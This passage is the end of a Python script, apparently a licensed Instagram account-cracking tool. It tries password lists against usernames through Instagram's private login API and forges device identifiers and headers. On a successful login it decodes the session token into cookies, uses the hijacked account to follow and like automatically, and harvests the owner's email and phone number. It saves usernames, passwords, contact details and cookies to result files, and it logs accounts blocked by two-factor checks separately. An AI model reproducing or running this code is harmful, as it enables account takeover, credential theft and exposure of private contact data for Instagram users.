            data = f'params=%7B%22client_input_params%22%3A%7B%22aac%22%3A%22%22%2C%22sim_phones%22%3A%5B%5D%2C%22aymh_accounts%22%3A%5B%7B%22profiles%22%3A%7B%22id%22%3A%7B%22is_derived%22%3A0%2C%22credentials%22%3A%5B%5D%2C%22account_center_id%22%3A%22%22%2C%22profile_picture_url%22%3A%22%22%2C%22small_profile_picture_url%22%3Anull%2C%22notification_count%22%3A0%2C%22token%22%3A%22%22%2C%22last_access_time%22%3A0%2C%22has_smartlock%22%3A0%2C%22credential_type%22%3A%22none%22%2C%22password%22%3A%22%22%2C%22from_accurate_privacy_result%22%3A0%2C%22dbln_validated%22%3A0%2C%22user_id%22%3A%22%22%2C%22name%22%3A%22%22%2C%22nta_eligibility_reason%22%3Anull%2C%22username%22%3A%22%22%2C%22account_source%22%3A%22%22%7D%7D%2C%22id%22%3A%22%22%7D%5D%2C%22network_bssid%22%3Anull%2C%22secure_family_device_id%22%3A%22%22%2C%22has_granted_read_contacts_permissions%22%3A0%2C%22auth_secure_device_id%22%3A%22%22%2C%22has_whatsapp_installed%22%3A1%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{base_ts}%3A{enc_pass}%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22block_store_machine_id%22%3A%22%22%2C%22ig_vetted_device_nonces%22%3Anull%2C%22cloud_trust_token%22%3Anull%2C%22event_flow%22%3A%22login_manual%22%2C%22password_contains_non_ascii%22%3A%22false%22%2C%22client_known_key_hash%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22has_granted_read_phone_permissions%22%3A0%2C%22app_manager_id%22%3A%22%22%2C%22should_show_nested_nta_from_aymh%22%3A1%2C%22device_id%22%3A%22android-{android_id}%22%2C%22zero_balance_state%22%3A%22%22%2C%22login_attempt_count%22%3A1%2C%22machine_id%22%3A%22{machine_id}%22%2C%22flash_call_permission_status%22%3A%7B%22READ_PHONE_STATE%22%3A%22DENIED%22%2C%22READ_CALL_LOG%22%3A%22DENIED%22%2C%22ANSWER_PHONE_CALLS%22%3A%22DENIED%22%7D%2C%22accounts_list%22%3A%5B%5D%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%7D%2C%22event_step%22%3A%22home_page%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22openid_tokens%22%3A%7B%7D%2C%22contact_point%22%3A%22{enc_user}%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_vanilla_password_page_empty_password%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22should_trigger_override_login_success_action%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{waterfall_id}%22%2C%22two_step_login_type%22%3A%22one_step_login%22%2C%22login_source%22%3A%22Login%22%2C%22is_platform_login%22%3A0%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22is_from_aymh%22%3A0%2C%22offline_experiment_group%22%3Anull%2C%22is_from_landing_page%22%3A0%2C%22left_nav_button_action%22%3A%22NONE%22%2C%22password_text_input_id%22%3A%22dqiey2%3A85%22%2C%22is_from_empty_password%22%3A0%2C%22is_from_msplit_fallback%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22username_text_input_id%22%3A%22dqiey2%3A84%22%2C%22layered_homepage_experiment_group%22%3A%22Deploy%3A+Not+in+Experiment%22%2C%22device_id%22%3A%22android-{android_id}%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A83058948200336%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A1%2C%22credential_type%22%3A%22password%22%2C%22is_from_password_entry_page%22%3A0%2C%22caller%22%3A%22gslr%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22is_from_assistive_id%22%3A0%2C%22access_flow_version%22%3A%22pre_mt_behavior%22%2C%22is_from_logged_in_switcher%22%3A0%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%22d8c9ee5552bc8349b7da08ef6eb65f8cbd6dcd5ee7c64215670ac3a52b79d06b%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=d8c9ee5552bc8349b7da08ef6eb65f8cbd6dcd5ee7c64215670ac3a52b79d06b'
            response = ses.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data,allow_redirects=True)
            #print(f" RESPON: {H}{response.text}\n")
            if "logged_in_use" in str(response.text.replace('\\', '')):
               # print("Response:", response.text)
                Ok += 1
                text_response = str(response.text.replace('\\', ''))
                ig_set_search = re.search('"IG-Set-Authorization": "(.*?)"', text_response)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1)
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
                        except:
                            cookies = ('-')
                    else:
                        cookies = ('-')
                else:
                    ig_set_authorization = None
                    cookies = None
                bot_follow(cookies)
                auto_like(cookies)
                followers,following = info_user(username)
                email, phone = info_kontak(cookies)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                    print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                    print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                    f.write(f"Fullnames : {name}\n")
                    f.write(f"Usernames : {username}\n")
                    f.write(f"Passwords : {password}\n")
                    f.write(f"EmailUser : {email}\n")
                    f.write(f"PhoneNumb : {phone}\n")
                    f.write(f"Followers : {followers}\n")
                    f.write(f"Following : {following}\n")
                    f.write(f"Cookies : {cookies}\n")
                    f.write("-" * 40 + "\n")
                break
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            else:
               # print(f" RESPON: {H}{response.text}\n")
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            continue
    Loop += 1


def Blok_ID():
    bloks_list = [
        'd8c9ee5552bc8349b7da08ef6eb65f8cbd6dcd5ee7c64215670ac3a52b79d06b',
        'e9f0aa6663cd9450c8eb19ff7fc76e9dce7eef6ff8d75326781bd4b63c80e17c',
        'f1a2bb7774de0561d9fc20aag8gd87f0edf8ff7g9e86437892ce5c74d91f28d'
    ]
    return random.choice(bloks_list)

def get_headers():
    bloks_version = Blok_ID()
    return {
        'host': 'b.i.instagram.com',
        'x-ig-app-locale': 'in_ID',
        'x-ig-device-locale': 'in_ID',
        'x-ig-mapped-locale': 'id_ID',
        'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
        'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
        'x-ig-bandwidth-speed-kbps': '-1.000',
        'x-ig-bandwidth-totalbytes-b': '0',
        'x-ig-bandwidth-totaltime-ms': '0',
        'x-bloks-version-id': bloks_version,
        'x-ig-www-claim': '0',
        'x-bloks-is-prism-enabled': 'false',
        'x-bloks-is-layout-rtl': 'false',
        'x-ig-device-id': str(uuid.uuid4()),
        'x-ig-family-device-id': str(uuid.uuid4()),
        'x-ig-android-id': 'android-f4d8eb2bd1b86a47',
        'x-ig-timezone-offset': str(timezone_offset()),
        'x-fb-connection-type': 'MOBILE.LTE',
        'x-ig-connection-type': 'MOBILE(LTE)',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-app-id': '567067343352427',
        'priority': 'u=3',
        'user-agent': 'Instagram 309.1.0.41.113 Android (31/10; 360dpi; 1080x2326; Vivo; V2020CA; V1950A; qcom; id_ID; 541635863)',
        'accept-language': 'id-ID, en-US',
        'x-mid': 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21)),
        'ig-intended-user-id': '0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-fb-http-engine': 'Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True'
    }

def Android_ID(username, password):
    xyz = hashlib.md5()
    xyz.update(username.encode('utf-8') + password.encode('utf-8'))
    hex_val = xyz.hexdigest()
    xyz.update(hex_val.encode('utf-8') + '12345'.encode('utf-8'))
    return xyz

def timezone_offset():
    tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
    return tim.utcoffset().total_seconds() / 60 / 60

def Metode5(username, name, pass_list):
    global Ok, Cp, A2f, Loop
    ses = requests.Session()
    with print_lock:
        print(f" {P}[{H}●{P}]{H} AttackV5 {P}({H}{Loop}{P}/{K}{len(Aray_Bejir)}{P})-{P}({H}{Ok}{P}/{K}{Cp}{P})",end="\r")
        sys.stdout.flush()
    for password in pass_list:
        try:
            uag = UA_APP()
            base_ts = int(time.time())
            paswd = f'#PWD_INSTAGRAM:0:{base_ts}:{password}'
            family_device_id = str(uuid.uuid4())
            waterfall_id = str(uuid.uuid4())
            android_id_val = 'android-' + Android_ID(username, password).hexdigest()[:16]
            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
            ses.headers.update({**get_headers(),
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                'x-ig-bandwidth-speed-kbps': str(random.randint(100,999)),
                'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                'x-ig-device-id': str(uuid.uuid4()),
                'x-ig-android-id': android_id_val,
                'x-ig-timezone-offset': str(timezone_offset()),
                'x-ig-app-id': '567067343352427',
                'x-mid': machine_id,
                'user-agent': uag
            })
            enc_pass = urllib.parse.quote_plus(paswd)
            data = f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{enc_pass}%22%2C%22contact_point%22%3A%22{username}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{android_id_val}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{waterfall_id}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{android_id_val}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%22{ses.headers.get("x-bloks-version-id")}%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id={ses.headers.get("x-bloks-version-id")}'
            ses.headers.update({'content-length': str(len(data)),'cookie': (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]),})
            response = ses.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)        
            if "logged_in_use" in str(response.text.replace('\\', '')):
               # print("Response:", response.text)
                Ok += 1
                text_response = str(response.text.replace('\\', ''))
                ig_set_search = re.search('"IG-Set-Authorization": "(.*?)"', text_response)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1)
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
                        except:
                            cookies = ('-')
                    else:
                        cookies = ('-')
                else:
                    ig_set_authorization = None
                    cookies = None
                bot_follow(cookies)
                auto_like(cookies)
                followers,following = info_user(username)
                email, phone = info_kontak(cookies)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                    print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                    print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                    f.write(f"Fullnames : {name}\n")
                    f.write(f"Usernames : {username}\n")
                    f.write(f"Passwords : {password}\n")
                    f.write(f"EmailUser : {email}\n")
                    f.write(f"PhoneNumb : {phone}\n")
                    f.write(f"Followers : {followers}\n")
                    f.write(f"Following : {following}\n")
                    f.write(f"Cookies : {cookies}\n")
                    f.write("-" * 40 + "\n")
                break
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            elif 'challenge_required' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            elif 'two_factor_required' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            else:
               # print(f" RESPON: {H}{response.text}\n")
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            #print(f"[ERROR] Exception occurred!")
            #print(f"[ERROR] Error type: {type(e).__name__}")
            #print(f"[ERROR] Message: {str(e)}")
            continue
    Loop += 1

def kadaluarsaa():
    banner()
    Kadaluarsa = "06-05-2026" 
    if datetime.datetime.now() > datetime.datetime.strptime(Kadaluarsa, "%d-%m-%Y"):
        cetak(panel(f'[bold white]Sorry [bold green]LICENSE CODE [bold white]You Are [bold red]Inactive [bold white]Or [bold red]Expired', width=58, style="bold white"))
        sys.exit()
    cetak(panel(f'[bold white]Good [bold green]LICENSE CODE [bold white]You [bold green]Active [bold white]Please Wait!!!!', width=58, style="bold white"))
    time.sleep(6)
    Menu()

def lisensi():
    banner()
    KodeLisensi = "C1EEQDNWPDJ7GMAOYZXV5VSFJ1LQFL" 
    Kadaluarsa1 = "13-05-2026"
    try:
        now = datetime.datetime.now()
        exp_date = datetime.datetime.strptime(Kadaluarsa1, "%d-%m-%Y")
        if now > exp_date:
            print("Sorry LICENSE CODE You Are Inactive Or Expired")
            sys.exit()
    except:
        print("Sorry LICENSE CODE You Are Inactive Or Expired")
        sys.exit()
    base_dir = os.path.expanduser("~/.config/.instagram")
    file_lisensi = os.path.join(base_dir, ".key")
    if not os.path.exists(file_lisensi):
        print("Sorry LICENSE CODE You Are Inactive Or Expired")
        sys.exit()
    try:
        with open(file_lisensi, "r") as f:
            stored_key = f.read().strip()
        if stored_key != KodeLisensi:
            print("Sorry LICENSE CODE You Are Inactive Or Expired")
            sys.exit()
    except:
        print("Sorry LICENSE CODE You Are Inactive Or Expired")
        sys.exit()
    print("Good LICENSE CODE You Are Active, Please Wait")
    time.sleep(3)
    Menu()


if __name__ == '__main__':
    os.makedirs('/sdcard/INSTAGRAM/RESULTS', exist_ok=True)
    os.makedirs('/sdcard/INSTAGRAM/RESULTS/SUCCESS', exist_ok=True)
    os.makedirs('/sdcard/INSTAGRAM/RESULTS/CHECKPOINT', exist_ok=True)
    os.makedirs('/sdcard/INSTAGRAM/RESULTS/AUTENTIKASI', exist_ok=True)
    os.makedirs('/sdcard/INSTAGRAM/DUMP', exist_ok=True)
    Menu()
